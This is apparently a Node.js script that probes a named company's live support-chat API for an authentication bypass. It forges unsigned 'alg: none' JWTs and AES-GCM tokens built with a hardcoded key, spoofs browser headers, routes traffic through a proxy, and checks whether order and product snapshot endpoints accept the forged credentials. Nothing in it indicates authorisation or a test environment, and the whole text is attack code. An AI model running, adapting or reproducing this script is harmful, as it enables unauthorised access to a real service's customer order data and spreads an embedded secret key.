const crypto=require('crypto');
const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://support.bambulab.com';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const b64u=(o)=>Buffer.from(JSON.stringify(o)).toString('base64url');
const key=Buffer.from('5WIuvjCRLf8DyALsXGhbUfvlvLf1xt043I02_YGmPOY','base64url');
function aesToken(plain){const iv=crypto.randomBytes(12);const c=crypto.createCipheriv('aes-256-gcm',key,iv);const ct=Buffer.concat([c.update(plain,'utf8'),c.final()]);const tag=c.getAuthTag();return Buffer.concat([iv,ct,tag]).toString('base64url');}
const jwtNone=b64u({alg:'none',typ:'JWT'})+'.'+b64u({cusId:'1234567890123456789',exp:Math.floor(Date.now()/1000)+3600})+'.';
const tokens=[['none',jwtNone],['aes-none',aesToken(jwtNone+'|'+(Date.now()+3600000))],['aes-dummy',aesToken('DUMMY|'+(Date.now()+3600000))],['garbage',aesToken('x')]];
async function post(path,body,headers,label){try{const r=await fetch(B+path,{method:'POST',headers:{'user-agent':UA,origin:B,referer:B+'/liveChat','content-type':'application/json',...headers},body:JSON.stringify(body),dispatcher:d,signal:AbortSignal.timeout(20000)});const t=await r.text();console.log(r.status,label,'|',t.slice(0,260).replace(/\s+/g,' '));}catch(e){console.log('ERR',label,e.message)}}
(async()=>{
 for(const [n,tok] of tokens){
  await post('/gw/robot/im/mall/card/snapshot',{cardType:'order',orderNo:'1'},{bbl_token:'Bearer '+tok},'snapshot '+n);
  await post('/gw/robot/im/mall/card/snapshot',{cardType:'product',productId:'1'},{bbl_token:'Bearer '+tok},'snapshot-product '+n);
 }
})();
